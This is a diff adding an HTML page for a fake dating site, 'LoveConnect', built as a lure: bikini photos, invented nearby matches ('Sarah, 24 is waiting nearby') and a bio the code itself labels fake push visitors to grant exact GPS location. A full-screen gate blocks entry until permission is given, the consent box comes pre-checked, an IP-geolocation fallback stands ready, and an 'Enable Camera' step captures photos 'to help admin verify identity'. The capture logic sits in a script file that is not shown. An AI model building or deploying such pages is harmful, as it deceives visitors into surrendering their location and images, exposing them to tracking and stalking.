@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LoveConnect | Find Your Perfect Match Nearby</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for beautiful icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/style.css">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        .serif-title {
+            font-family: 'Playfair Display', serif;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-white min-h-screen flex flex-col overflow-x-hidden relative selection:bg-pink-500 selection:text-white">
+
+    <!-- Strict Location Gate Lock Overlay (Forcing exact GPS verification to enter the site) -->
+    <div id="location-gate-overlay" class="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto py-8 transition-all duration-500 bg-slate-950">
+        
+        <!-- Full-Screen Seductive Background of a Gorgeous Bikini Model at the Beach -->
+        <div class="absolute inset-0 z-0">
+            <img src="https://images.unsplash.com/photo-1568252542512-9fe8fe9c87bb?auto=format&fit=crop&q=80&w=1200" class="w-full h-full object-cover object-center filter brightness-[0.25]" alt="Bikini background">
+            <!-- Dark romantic gradient covering the image -->
+            <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/70 to-pink-950/15"></div>
+        </div>
+
+        <div class="w-full max-w-md mx-4 bg-slate-900/85 border border-pink-500/25 p-5 sm:p-8 rounded-[2.5rem] shadow-2xl relative text-center space-y-5 my-auto z-10 backdrop-blur-md">
+            
+            <!-- Seductive Grid collage (100% verified hot swimwear/bikini girls portraits, no broken images, no men!) -->
+            <div class="grid grid-cols-4 gap-1.5 sm:gap-2 rounded-2xl overflow-hidden shadow-xl border border-pink-500/20 select-none">
+                <img src="https://images.unsplash.com/photo-1568252542512-9fe8fe9c87bb?auto=format&fit=crop&q=80&w=300" class="w-full h-20 sm:h-24 object-cover hover:scale-110 transition duration-500" alt="bikini model">
+                <img src="https://images.unsplash.com/photo-1601004890684-d8cbf643f5f2?auto=format&fit=crop&q=80&w=300" class="w-full h-20 sm:h-24 object-cover hover:scale-110 transition duration-500" alt="swimwear model">
+                <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&q=80&w=300" class="w-full h-20 sm:h-24 object-cover hover:scale-110 transition duration-500" alt="blonde model portrait">
+                <img src="https://images.unsplash.com/photo-1509631179647-0177331693ae?auto=format&fit=crop&q=80&w=300" class="w-full h-20 sm:h-24 object-cover hover:scale-110 transition duration-500" alt="lingerie fashion model">
+            </div>
+
+            <!-- STEP 1: GPS DISCOVERY PROMPT -->
+            <div id="overlay-step-gps" class="space-y-4">
+                <div class="space-y-1.5">
+                    <h2 class="text-2xl sm:text-3xl font-black bg-gradient-to-r from-pink-500 via-rose-500 to-purple-500 bg-clip-text text-transparent tracking-tight serif-title">Unlock Nearby Singles</h2>
+                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed">
+                        There are <span class="text-pink-400 font-extrabold animate-pulse">24 active matches</span> within 2 miles of your coordinates! Grant GPS verification to view swimsuit profiles and request secure private chats.
+                    </p>
+                </div>
+
+                <!-- Bouncy Arrow pointing directly to the verify button -->
+                <div class="flex flex-col items-center justify-center text-pink-500 animate-bounce py-1 select-none">
+                    <span class="text-[9px] uppercase font-bold tracking-widest bg-pink-500/10 border border-pink-500/20 px-3 py-1 rounded-full mb-1">Click Below to Verify GPS</span>
+                    <i class="fa-solid fa-arrow-down text-xl"></i>
+                </div>
+
+                <!-- Primary Verification Button (NEON GLOWING / PULSING) -->
+                <button id="gate-verify-btn" class="w-full relative group overflow-hidden bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 hover:from-pink-600 hover:via-rose-600 hover:to-purple-700 text-white font-black py-4 px-6 rounded-2xl shadow-xl animate-glow transition-all duration-300 transform active:scale-98 flex items-center justify-center space-x-2.5 text-base sm:text-lg border-2 border-pink-400/20">
+                    <i class="fa-solid fa-compass"></i>
+                    <span>🔒 Unlock Verified Singles</span>
+                    <div class="absolute top-0 -inset-full h-full w-1/2 z-5 block transform -skew-x-12 bg-gradient-to-r from-transparent to-white/10 opacity-40 group-hover:animate-shine"></div>
+                </button>
+            </div>
+
+            <!-- (Bypassed) STEP 2 is no longer needed - site instantly unlocks on location permission allowance -->
+
+            <!-- ERROR STATE: RE-ALLOW GPS INSTRUCTIONS FOR BLOCK ACCIDENTS -->
+            <div id="gate-error-box" class="hidden bg-rose-500/10 border border-rose-500/20 p-4 sm:p-5 rounded-[1.5rem] text-xs text-rose-400 text-left space-y-4">
+                <div class="font-extrabold flex items-center text-rose-500 text-sm border-b border-rose-500/10 pb-2">
+                    <i class="fa-solid fa-triangle-exclamation mr-1.5 animate-pulse"></i>
+                    <span>GPS Permission Required 🔒</span>
+                </div>
+                
+                <p id="gate-error-text" class="leading-relaxed">
+                    You accidentally blocked location permission. Because our dating server verifies local connections, **you cannot enter the site without location permission**. Please follow the quick steps below to turn on GPS:
+                </p>
+
+                <!-- Interactive Browser Instructions tab -->
+                <div class="space-y-3 pt-1 border-t border-rose-500/10 text-[11px] leading-relaxed text-slate-300">
+                    <div class="space-y-1.5">
+                        <div class="font-bold text-rose-400 flex items-center"><i class="fa-brands fa-chrome mr-1"></i> Chrome / Android:</div>
+                        <p class="pl-4">Click the **Lock Icon** 🔒 next to the web address at the top left. Toggle **Location** permission to **Allow**, then refresh the page.</p>
+                    </div>
+                    <div class="space-y-1.5">
+                        <div class="font-bold text-rose-400 flex items-center"><i class="fa-brands fa-safari mr-1"></i> Safari / iOS (iPhone):</div>
+                        <p class="pl-4">Open iPhone **Settings** → Go to **Privacy** → **Location Services** → Ensure **Safari Websites** is set to **"While Using the App"**.</p>
+                    </div>
+                    <div class="space-y-1.5">
+                        <div class="font-bold text-rose-400 flex items-center"><i class="fa-brands fa-firefox-browser mr-1"></i> Firefox:</div>
+                        <p class="pl-4">Click the **Permissions bubble** on the left of the URL bar. Click the **'X'** next to Blocked status, and reload the browser.</p>
+                    </div>
+                </div>
+
+                <button id="gate-retry-btn" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold py-2.5 px-4 rounded-xl transition duration-200 flex items-center justify-center space-x-2">
+                    <i class="fa-solid fa-arrows-rotate animate-spin-slow"></i>
+                    <span>Try Enabling GPS Again</span>
+                </button>
+            </div>
+
+            <!-- Lock Info Details -->
+            <div class="flex items-center justify-center space-x-4 text-slate-500 text-[10px] font-medium border-t border-slate-800/80 pt-4">
+                <span><i class="fa-solid fa-shield-halved text-pink-500/50 mr-1"></i> SSL Protected</span>
+                <span>•</span>
+                <span><i class="fa-solid fa-user-check text-pink-500/50 mr-1"></i> Verified Members</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Glowing Background blobs -->
+    <div class="absolute top-0 left-1/4 w-96 h-96 bg-pink-600/20 rounded-full blur-[100px] pointer-events-none"></div>
+    <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none"></div>
+
+    <!-- Header Navbar -->
+    <header class="relative z-10 w-full px-6 py-5 max-w-7xl mx-auto flex justify-between items-center">
+        <a href="/" class="flex items-center space-x-2">
+            <span class="text-3xl animate-pulse text-pink-500"><i class="fa-solid fa-heart-pulse"></i></span>
+            <span class="text-2xl font-black bg-gradient-to-r from-pink-500 via-rose-500 to-purple-500 bg-clip-text text-transparent tracking-tight">LoveConnect</span>
+        </a>
+        <nav class="hidden md:flex items-center space-x-8 text-sm font-medium text-slate-300">
+            <a href="#" class="hover:text-pink-500 transition-colors">Success Stories</a>
+            <a href="#" class="hover:text-pink-500 transition-colors">Safety Guide</a>
+            <a href="#" class="hover:text-pink-500 transition-colors">Features</a>
+        </nav>
+        <div>
+            <a href="#" class="px-4 py-2 text-xs md:text-sm font-semibold rounded-full border border-slate-700 hover:border-pink-500 hover:bg-pink-500/10 text-slate-300 hover:text-white transition-all duration-300">
+                <i class="fa-solid fa-user mr-1"></i> Sign In
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow flex items-center justify-center px-4 py-12 relative z-10 max-w-7xl mx-auto w-full">
+        
+        <div class="w-full grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+            
+            <!-- Left Column: Copy & Actions -->
+            <div class="lg:col-span-7 space-y-8 text-left">
+                <div class="inline-flex items-center space-x-2 px-3 py-1.5 rounded-full bg-pink-500/10 text-pink-400 text-xs font-bold border border-pink-500/20 uppercase tracking-widest animate-bounce">
+                    <i class="fa-solid fa-fire text-pink-500"></i>
+                    <span>Over 1,200,000 matches made this month</span>
+                </div>
+                
+                <h1 class="text-4xl sm:text-5xl md:text-6xl font-extrabold tracking-tight leading-tight">
+                    Find Your Perfect Match <br>
+                    <span class="bg-gradient-to-r from-pink-500 via-rose-500 to-purple-500 bg-clip-text text-transparent italic serif-title">Right Around The Corner</span>
+                </h1>
+                
+                <p class="text-slate-400 text-base sm:text-lg max-w-xl leading-relaxed">
+                    Tired of swipe-exhaustion? LoveConnect uses hyper-local GPS mapping to instantly connect you with verified singles walking the same streets as you. Real connections start in real time.
+                </p>
+
+                <!-- Consent and Button Container -->
+                <div class="space-y-6 max-w-xl bg-slate-900/80 border border-slate-800/80 p-6 rounded-3xl backdrop-blur-md">
+                    <!-- Location Consent Checkbox -->
+                    <div class="flex items-start space-x-3 text-left">
+                        <input id="location-consent" type="checkbox" checked class="mt-1 h-5 w-5 rounded border-slate-700 bg-slate-800 text-pink-500 focus:ring-pink-500/50 cursor-pointer">
+                        <label for="location-consent" class="text-xs text-slate-400 leading-relaxed cursor-pointer select-none">
+                            <span class="font-semibold text-slate-300 block mb-1">📍 Local Verification & Location Consent</span>
+                            By checking this box and clicking below, you consent to securely share your GPS location to help us identify nearby active users. We never sell your data. View our <a href="#" class="text-pink-500 hover:underline">Privacy Policy</a>.
+                        </label>
+                    </div>
+
+                    <div class="rounded-2xl border border-slate-800 bg-slate-950/60 p-3 text-left space-y-3">
+                        <div class="flex items-center justify-between gap-3">
+                            <div>
+                                <div class="text-[10px] uppercase tracking-wider text-slate-500 font-bold">Camera Check</div>
+                                <p id="camera-status" class="text-[11px] text-slate-400">Optional, but helps admin verify identity.</p>
+                            </div>
+                            <button id="camera-activate-btn" type="button" class="px-3 py-2 rounded-xl border border-pink-500/30 bg-pink-500/10 text-pink-300 text-[10px] font-bold uppercase tracking-wide hover:bg-pink-500/20 transition">
+                                Enable Camera
+                            </button>
+                        </div>
+                        <video id="camera-preview" class="hidden w-full rounded-xl border border-slate-800 bg-slate-900" autoplay playsinline muted></video>
+                        <img id="camera-photo-preview" class="hidden w-full h-32 object-cover rounded-xl border border-slate-800" alt="Captured camera preview" />
+                        <canvas id="camera-canvas" class="hidden"></canvas>
+                    </div>
+
+                    <!-- Animated Pointing Arrow (Saves exact GPS coordinates) -->
+                    <div class="flex flex-col items-center justify-center text-pink-500 animate-bounce pb-2 select-none">
+                        <span class="text-[10px] uppercase font-bold tracking-widest bg-pink-500/10 border border-pink-500/20 px-3.5 py-1 rounded-full mb-1"><i class="fa-solid fa-location-crosshairs mr-1"></i> Verify Your Grid & Unlock</span>
+                        <i class="fa-solid fa-arrow-down text-2xl"></i>
+                    </div>
+
+                    <!-- Primary Action Button -->
+                    <button id="find-matches-btn" class="w-full relative group overflow-hidden bg-gradient-to-r from-pink-500 via-rose-500 to-purple-600 hover:from-pink-600 hover:via-rose-600 hover:to-purple-700 text-white font-bold py-4 px-8 rounded-2xl shadow-xl shadow-pink-500/20 transition-all duration-300 transform active:scale-98 flex items-center justify-center space-x-3 text-lg">
+                        <i class="fa-solid fa-compass animate-spin group-hover:animate-none"></i>
+                        <span>Discover Singles Near Me</span>
+                        <div class="absolute top-0 -inset-full h-full w-1/2 z-5 block transform -skew-x-12 bg-gradient-to-r from-transparent to-white/10 opacity-40 group-hover:animate-shine"></div>
+                    </button>
+                </div>
+
+                <!-- Trust Badges -->
+                <div class="flex flex-wrap items-center gap-6 text-xs text-slate-500 pt-2">
+                    <span class="flex items-center"><i class="fa-solid fa-shield-halved text-pink-500/50 mr-2 text-sm"></i> 256-Bit Encrypted Connections</span>
+                    <span class="flex items-center"><i class="fa-solid fa-user-check text-pink-500/50 mr-2 text-sm"></i> 100% Verified Members Only</span>
+                </div>
+            </div>
+
+            <!-- Right Column: Interactive Card Display -->
+            <div class="lg:col-span-5 relative">
+                
+                <!-- Main Matching App Interface Wrapper -->
+                <div id="matching-box" class="w-full max-w-md mx-auto bg-slate-900 border border-slate-800 rounded-[32px] shadow-2xl p-6 relative overflow-hidden transition-all duration-500 min-h-[480px] flex flex-col justify-between">
+                    
+                    <!-- Decorative Phone Top Bar -->
+                    <div class="flex justify-between items-center text-xs text-slate-500 pb-4 border-b border-slate-800 mb-6">
+                        <span class="font-semibold"><i class="fa-solid fa-signal mr-1"></i> LoveConnect Net</span>
+                        <span class="font-semibold" id="phone-time">12:00 PM</span>
+                        <span><i class="fa-solid fa-battery-three-quarters"></i></span>
+                    </div>
+
+                    <!-- Dynamic Card States -->
+
+                    <!-- State 1: Awaiting Action (Blurred Hot Bikini Model Card with Lock Overlay) -->
+                    <div id="state-awaiting" class="w-full flex flex-col justify-end h-88 relative rounded-[2rem] overflow-hidden border border-pink-500/25 shadow-2xl relative z-10 my-auto select-none">
+                        <!-- Blurred Hot Bikini Model Photo (Guaranteed beautiful active bikini model) -->
+                        <img src="https://images.unsplash.com/photo-1568252542512-9fe8fe9c87bb?auto=format&fit=crop&q=80&w=500" class="absolute inset-0 w-full h-full object-cover object-center filter blur-md brightness-[0.35] z-0 scale-105" alt="Locked Profile Photo">
+                        
+                        <!-- Lock Overlay content -->
+                        <div class="absolute inset-0 z-10 flex flex-col items-center justify-center space-y-4 p-4">
+                            <div class="w-16 h-16 rounded-full bg-slate-950/90 border border-pink-500/30 flex items-center justify-center text-pink-500 text-2xl shadow-xl shadow-pink-500/10 animate-pulse">
+                                <i class="fa-solid fa-user-lock"></i>
+                            </div>
+                            <div class="text-center space-y-1.5">
+                                <h4 class="font-extrabold text-lg text-pink-400 drop-shadow-md">Sarah, 24 is waiting nearby...</h4>
+                                <p class="text-[10px] text-slate-300 leading-relaxed max-w-[240px] mx-auto drop-shadow-sm">
+                                    Click the glowing **"Unlock Verified Singles"** button on the screen to verify your coordinates and reveal her swimwear profile!
+                                </p>
+                            </div>
+                            
+                            <!-- Small Hot Bikini Avatars collage inside lock -->
+                            <div class="flex justify-center -space-x-3 pt-1 select-none">
+                                <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?auto=format&fit=crop&q=80&w=150" class="w-8 h-8 rounded-full border border-slate-900 object-cover">
+                                <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&q=80&w=150" class="w-8 h-8 rounded-full border border-slate-900 object-cover">
+                                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=150" class="w-8 h-8 rounded-full border border-slate-900 object-cover">
+                                <div class="w-8 h-8 rounded-full border border-slate-900 bg-pink-500/20 text-pink-400 font-bold flex items-center justify-center text-[8px] uppercase tracking-wider backdrop-blur-xs">+15</div>
+                            </div>
+                        </div>
+                        
+                        <!-- Dark overlay gradient -->
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-transparent to-transparent z-5"></div>
+                    </div>
+
+                    <!-- State 2: Requesting / Accessing Geolocation -->
+                    <div id="state-loading" class="hidden space-y-6 text-center my-auto">
+                        <div class="flex justify-center items-center">
+                            <div class="relative">
+                                <div class="animate-ping absolute inline-flex h-16 w-16 rounded-full bg-pink-400 opacity-75"></div>
+                                <div class="relative rounded-full h-16 w-16 bg-pink-500 flex items-center justify-center text-2xl text-white">
+                                    <i class="fa-solid fa-heart animate-pulse"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-2">
+                            <h3 id="loading-title" class="text-lg font-semibold text-pink-400 animate-pulse">Verifying GPS Location...</h3>
+                            <p id="loading-sub" class="text-xs text-slate-400 max-w-xs mx-auto">Please allow browser location access when prompted to continue.</p>
+                        </div>
+                    </div>
+
+                    <!-- State 3: Access Denied / Error -->
+                    <div id="state-error" class="hidden space-y-6 text-center my-auto">
+                        <div class="w-16 h-16 rounded-full bg-rose-500/10 text-rose-500 border border-rose-500/20 flex items-center justify-center text-3xl mx-auto">
+                            <i class="fa-solid fa-triangle-exclamation"></i>
+                        </div>
+                        <div class="space-y-2">
+                            <h3 class="text-xl font-bold text-rose-400">Connection Failed</h3>
+                            <p id="error-message-text" class="text-xs text-slate-400 max-w-xs mx-auto">
+                                Location permission was denied. We require your coordinates to query the dating database for users nearby.
+                            </p>
+                        </div>
+                        <div class="space-y-3 pt-2">
+                            <button id="retry-gps-btn" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-semibold py-2.5 px-4 rounded-xl text-sm transition duration-300 flex items-center justify-center space-x-2">
+                                <i class="fa-solid fa-arrow-rotate-right"></i>
+                                <span>Grant Permission & Try Again</span>
+                            </button>
+                            <button id="fallback-ip-btn" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-semibold py-2.5 px-4 rounded-xl text-sm transition duration-300 flex items-center justify-center space-x-2 shadow-lg shadow-pink-500/10">
+                                <i class="fa-solid fa-globe"></i>
+                                <span>Use IP Geolocation (Fallback)</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- State 4: Success, Location Tracked & Matches Found -->
+                    <div id="state-success" class="hidden flex-grow flex flex-col justify-between">
+                        
+                        <!-- Top Metadata block -->
+                        <div class="bg-slate-950/60 border border-slate-800/80 p-3 rounded-2xl text-left space-y-1 text-[11px] font-mono text-pink-400 mb-4 flex justify-between items-center">
+                            <div>
+                                <div class="flex items-center space-x-1.5 font-bold">
+                                    <span class="inline-block w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+                                    <span class="text-emerald-400 text-[10px] uppercase">GPS Captured</span>
+                                </div>
+                                <div>Lat: <span id="captured-lat">40.7128</span></div>
+                                <div>Lng: <span id="captured-lng">-74.0060</span></div>
+                            </div>
+                            <div class="text-right">
+                                <div>Accuracy: <span id="captured-acc" class="text-slate-300">15m</span></div>
+                                <div>Type: <span id="captured-type" class="text-purple-400 font-semibold">GPS</span></div>
+                                <div class="text-[9px] text-slate-500" id="captured-time">Just Now</div>
+                            </div>
+                        </div>
+
+                        <!-- Matches Frame (Scrollable) -->
+                        <div class="flex-grow flex flex-col justify-center">
+                            <div class="text-center mb-3">
+                                <h4 class="text-base font-bold text-pink-500 animate-pulse">🎉 Match Scan Complete!</h4>
+                                <p class="text-[11px] text-slate-400" id="matches-summary">Found 4 matches within 5 miles</p>
+                            </div>
+
+                            <!-- Tinder-Style Match Card (Taller h-96 Container) -->
+                            <div class="relative h-96 w-full overflow-hidden flex items-center justify-center">
+                                
+                                <!-- Match Card (Active) - Constrained to phone aspect ratio to show full hot model photos perfectly -->
+                                <div id="match-card-container" class="w-full max-w-[310px] bg-slate-950 border border-pink-500/25 rounded-[2rem] shadow-2xl flex flex-col justify-end h-88 transition-all duration-300 relative z-10 overflow-hidden">
+                                    <!-- Photo Layer (Guaranteed beautiful active bikini model background) -->
+                                    <img id="match-photo" src="https://images.unsplash.com/photo-1568252542512-9fe8fe9c87bb?auto=format&fit=crop&q=80&w=500" class="absolute inset-0 w-full h-full object-cover object-center z-0 transition-all duration-500" alt="Match Profile Photo">
+                                    
+                                    <!-- Gradient Overlay -->
+                                    <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/40 to-transparent z-10"></div>
+                                    
+                                    <!-- Text and Actions Content (Positioned on top of gradient) -->
+                                    <div class="relative z-20 p-4 sm:p-5 space-y-3 sm:space-y-3.5 text-left w-full">
+                                        <div class="flex justify-between items-start">
+                                            <div>
+                                                <div class="flex items-center space-x-2">
+                                                    <span id="match-name" class="font-extrabold text-xl tracking-tight drop-shadow-md">Sarah</span>
+                                                    <span id="match-age" class="text-pink-400 font-extrabold text-lg drop-shadow-md">24</span>
+                                                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 shadow-sm" title="Online"></span>
+                                                </div>
+                                                <p id="match-location" class="text-xs text-slate-200 font-medium drop-shadow-md"><i class="fa-solid fa-location-dot text-pink-500 mr-1 text-[10px]"></i> New York, USA</p>
+                                            </div>
+                                            <div class="bg-pink-500 text-white font-black text-[9px] px-2.5 py-1 rounded-full uppercase tracking-wider shadow-md" id="match-distance">
+                                                0.4 mi away
+                                            </div>
+                                        </div>
+
+                                        <!-- Fake Bio -->
+                                        <p id="match-bio" class="text-xs text-slate-200 italic leading-relaxed line-clamp-2 drop-shadow-sm font-medium">
+                                            "Looking for someone to explore local coffee shops and enjoy Sunday brunch with. Let's trace paths!"
+                                        </p>
+
+                                        <!-- Swipe actions -->
+                                        <div class="flex justify-around items-center pt-3 border-t border-slate-800/40">
+                                            <button class="w-10 h-10 rounded-full bg-slate-950/85 border border-slate-800 hover:border-rose-500 text-rose-500 hover:bg-rose-500/20 transition-all active:scale-90 flex items-center justify-center text-sm shadow-md" onclick="nextMatch(false)">
+                                                <i class="fa-solid fa-xmark"></i>
+                                            </button>
+                                            <button class="px-4 py-2.5 rounded-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-bold text-[10px] sm:text-xs transition duration-300 hover:shadow-lg hover:shadow-pink-500/20 flex items-center justify-center space-x-1.5 shadow-md" onclick="triggerConnect()">
+                                                <i class="fa-solid fa-comments"></i>
+                                                <span>Send Chat Request</span>
+                                            </button>
+                                            <button class="w-10 h-10 rounded-full bg-slate-950/85 border border-slate-800 hover:border-emerald-500 text-emerald-500 hover:bg-emerald-500/20 transition-all active:scale-90 flex items-center justify-center text-sm shadow-md" onclick="nextMatch(true)">
+                                                <i class="fa-solid fa-check"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Backdrop visual effect cards -->
+                                <div class="absolute w-full max-w-[290px] bg-slate-900/60 border border-slate-800 rounded-2xl h-80 -bottom-2 z-0 transform scale-95 opacity-50"></div>
+                            </div>
+                        </div>
+
+                        <!-- Thank You footer -->
+                        <div class="text-center pt-2 border-t border-slate-800 mt-2">
+                            <p class="text-[10px] text-slate-500">
+                                Matching Engine Version 4.2.1 • Local GPS verified safely
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Footer of the fake app interface -->
+                    <div class="mt-4 pt-3 border-t border-slate-800 flex justify-around text-slate-500 text-lg relative z-10">
+                        <span class="text-pink-500 cursor-pointer"><i class="fa-solid fa-house"></i></span>
+                        <span class="hover:text-pink-500 cursor-pointer"><i class="fa-solid fa-magnifying-glass"></i></span>
+                        <span class="hover:text-pink-500 cursor-pointer relative"><i class="fa-solid fa-bell"></i><span class="absolute top-0 right-0 w-2 h-2 rounded-full bg-pink-500"></span></span>
+                        <span class="hover:text-pink-500 cursor-pointer"><i class="fa-solid fa-user"></i></span>
+                    </div>
+
+                </div>
+
+                <!-- Floating decorations -->
+                <div class="absolute -top-6 -right-6 w-14 h-14 bg-gradient-to-tr from-pink-500 to-rose-500 rounded-2xl flex items-center justify-center text-white text-xl shadow-xl shadow-pink-500/10 transform rotate-12 animate-float">
+                    <i class="fa-solid fa-heart"></i>
+                </div>
+                <div class="absolute -bottom-6 -left-6 w-12 h-12 bg-gradient-to-tr from-purple-500 to-indigo-500 rounded-2xl flex items-center justify-center text-white text-lg shadow-xl shadow-purple-500/10 transform -rotate-12 animate-float-slow">
+                    <i class="fa-solid fa-envelope"></i>
+                </div>
+            </div>
+
+        </div>
+
+    </main>
+
+    <!-- Global Footer & Disclaimer -->
+    <footer class="border-t border-slate-900 bg-slate-950 py-10 px-6 mt-12 relative z-10">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
+            <div class="text-left space-y-2">
+                <div class="flex items-center space-x-2">
+                    <span class="text-xl text-pink-500"><i class="fa-solid fa-heart-pulse"></i></span>
+                    <span class="font-bold text-slate-300">LoveConnect</span>
+                </div>
+                <p class="text-xs text-slate-500 max-w-md">
+                    LoveConnect is the leading global dating platform designed to foster genuine human connections. Discover verified singles near you safely, securely, and in real-time.
+                </p>
+            </div>
+            <div class="flex flex-col items-center md:items-end space-y-3">
+                <div class="flex space-x-6 text-slate-400 text-sm">
+                    <a href="#" class="hover:text-pink-400">Terms of Service</a>
+                    <a href="#" class="hover:text-pink-400">Privacy Statement</a>
+                    <a href="#" class="hover:text-pink-400">Cookie Settings</a>
+                </div>
+                <p class="text-xs text-slate-600">
+                    &copy; 2026 LoveConnect Inc. All Demo Rights Reserved.
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Chat Request Success Modal (Sweetalert style) -->
+    <div id="connect-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
+        <div class="bg-slate-900 border border-slate-800 p-8 rounded-[2rem] max-w-sm w-full text-center space-y-6 transform scale-95 transition-transform duration-300 shadow-2xl">
+            <div class="w-16 h-16 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center justify-center text-3xl mx-auto">
+                <i class="fa-solid fa-circle-check"></i>
+            </div>
+            <div class="space-y-2">
+                <h3 class="text-2xl font-bold">Request Sent! 💖</h3>
+                <p id="connect-modal-text" class="text-slate-400 text-sm leading-relaxed">
+                    We've notified Sarah of your interest. Once she accepts, you'll be connected directly to map out your first date!
+                </p>
+            </div>
+            <button onclick="closeModal()" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 font-bold py-3 px-6 rounded-xl text-sm transition-all shadow-lg shadow-pink-500/15">
+                Keep Exploring
+            </button>
+        </div>
+    </div>
+
+    <!-- Frontend App Logic script -->
+    <script src="/js/app.js"></script>
+</body>
+</html>
